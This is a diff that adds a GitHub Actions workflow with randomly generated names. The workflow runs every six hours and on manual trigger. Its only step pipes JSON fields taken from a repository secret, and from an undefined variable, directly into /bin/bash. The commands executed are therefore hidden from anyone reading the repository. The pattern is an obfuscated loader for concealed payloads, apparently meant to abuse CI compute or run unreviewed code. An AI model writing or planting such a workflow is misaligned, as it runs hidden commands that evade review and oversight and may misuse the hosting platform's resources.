@@ -1,0 +1,19 @@
+name: sweatyforceful
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sweatyforceful
+        env:
+          bjprf19: ${{ secrets.bjprf19 }}
+        run: |
+          echo $bjprf19 | jq -r .cj81 | /bin/bash
+          echo $en94 | jq -r .ldqqs34187 | /bin/bash
+
